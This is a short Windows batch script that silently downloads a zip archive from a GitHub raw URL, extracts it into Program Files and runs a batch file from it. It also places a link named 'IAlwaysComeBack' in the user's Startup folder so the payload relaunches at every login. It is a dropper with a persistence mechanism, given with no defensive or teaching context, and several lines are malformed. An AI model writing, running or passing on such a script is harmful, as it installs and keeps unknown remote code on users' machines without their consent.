@echo off

cd C:\"Program Files\"
curl.exe -s -O EatMyShortz.zip "https://raw.githubusercontent.com/MyelinLennox/refs/heads/FunnyCalculator/main/EatMyShortz.zip"
tar -xf ".\EatMyShortz.zip" -C ".\"

mklink "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\IAlwaysComeBack.lnk" "C:\Program Files\EatMy
Shortz\IAlwaysComeBack.bat"
./C:\Program Files\EatMyShortz\IAlwaysComeBack.bat
